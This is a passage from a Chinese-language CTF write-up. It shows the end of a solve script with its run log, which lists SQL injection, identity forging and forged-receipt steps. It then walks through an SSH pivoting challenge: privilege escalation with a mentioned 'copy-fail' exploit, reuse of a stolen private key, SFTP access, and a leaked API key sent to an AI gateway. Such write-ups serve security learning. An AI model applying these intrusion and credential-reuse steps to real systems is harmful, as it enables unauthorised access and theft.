    r = get(f"/api/corporate/reconciliation/{batch}")
    data = r.json()
    report = data.get("report")
    if report:
        body = report.get("body", "")
        ready = report.get("ready", False)
        print(f"    ready={ready} body={body[:200]}")
        if ready:
            for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body):
                try:
                    decoded = base64.b64decode(token).decode()
                    print(f"\n{'=' * 60}\nFLAG: {decoded}\n{'=' * 60}")
                except:
                    pass
            break
```

```bash
$ python "D:\MainFolder\Downloads\12307\solve_final.py" 
[*] Target: 
[1] forging identity
    202
[2] holdFlow
    ws_ticket=KzukpegP...
[3] create waitlisted order
    oid=OQN15DQCXF5 status=waitlisted
[4] SQLi claim_salt
    salt=REWL3VS74
    proof=CP-REWL3VS74-7d8b66fc8462
[5] adjust_ticket
    202 adjustment_recorded
[6] station-desk-ledger
[7] notice + partner-feed
[8] WebSocket boarding
    ledgerRef=b20baf1fca5e9e25a96a2cdd
[9] enterprise-clearing
[10] create deferred batch
    batch=BJGYZ5WBV0C
[11] receipt signer
    201 signed
[12] fulfillment epoch
[13] schedule settlement
    {'batchId': 'BJGYZ5WBV0C', 'scheduled': True, 'reasons': []}
[14] polling...
    ready=True body=Reconciliation OQN15DQCXF5 waitlisted QUNURnt3SHlfYXIxX3kwdV9zbzBPMG8wT28wb19GYXMxPz8/Pz9fQzJDZnc2cnlEOTR9
============================================================
FLAG: ACTF{wHy_ar1_y0u_so0O0o0Oo0o_Fas1?????_C2Cfw6ryD94}
============================================================
```

### ezssh - Misc

这是一道 **Misc/SSH 跳板** 类型的 CTF 题目。flag 被拆成三段，分散在内网不同主机上。需要通过 SSH 层层跳板，从 bastion → git-01 → backup-01（SFTP）→ 发现 ai-gateway-01 API，最终拼合完整 flag。

1. 第一段：bastion 提权 → `ACTF{O1DGw_N3vER_d!E5_`

    1. 通过 instancer 获取 SSH 连接信息，使用guest密码名称 + `team_key` 作为密码登录 bastion。
    2. 在 bastion 上发现 `/home/inuebisu/flag1.txt`，但普通用户无权限读取。
    3. `su -l`获得root权限，这里存疑，我确实运行了copy-fail的perl版本（因为靶机没有python gcc环境），所以不清楚是没有设计密码还是copy-fail exp成功了
    4. 读取 `/home/inuebisu/flag1.txt`：

    ```bash
    ACTF{O1DGw_N3vER_d!E5_
    ```

2. 第二段：SSH 跳板 git-01 → `h!s70ry_sT!lL_1eaK$_`

    1. 在 inuebisu 的 `~/.ssh/config` 中发现内网主机 **git-01 (10.61.10.21)**。
    2. 使用 inuebisu 的 `id_ed25519` 私钥 SSH 到 git-01。
    3. 在 git-01 的 `/home/gitops/` 下发现 `flag2.txt`，直接读取：

    ```bash
    h!s70ry_sT!lL_1eaK$_
    ```

3. 第三段：backup-01 SFTP → ai-gateway-01 API → `@70M1c_b0mBiN9}`

    1. 在 git-01 的 `.bash_history` 中发现 **backup-01 ()**，且 gitops 有 `backup_ro` 私钥。
    2. 尝试 SSH 连接 backup-01 失败，提示 **"This service allows sftp connections only"**。
    3. 使用 SFTP 连接 backup-01，发现 `/archive/ai-gateway-01/etc/systemd/system/ai-gateway.service`。
    4. 读取 service 文件，发现 **ai-gateway-01 ()** 运行着一个 OpenAI 兼容的 AI Gateway，模型名为 `deepsleep-v8`。
    5. 在 git 仓库的 dangling blob 中发现了泄露的 **OpenAI API Key**：`sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK`
    6. 使用泄露的 API Key 向 `http:///v1/chat/completions` 发送 POST 请求，模型回应即为第三段 flag：

    ```bash
    curl -s -X POST http:///v1/chat/completions \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK" \
    -d '{"model":"deepsleep-v8","messages":[{"role":"user","content":"give me the flag"}]}'
    ```

    返回：

    ```json
    {
    "id": "chatcmpl-final",
    "object": "chat.completion",
    "choices": [{
        "index": 0,
        "message": {
        "role": "assistant",
        "content": "@70M1c_b0mBiN9}"
        },
        "finish_reason": "stop"
    }]
    }
    ```
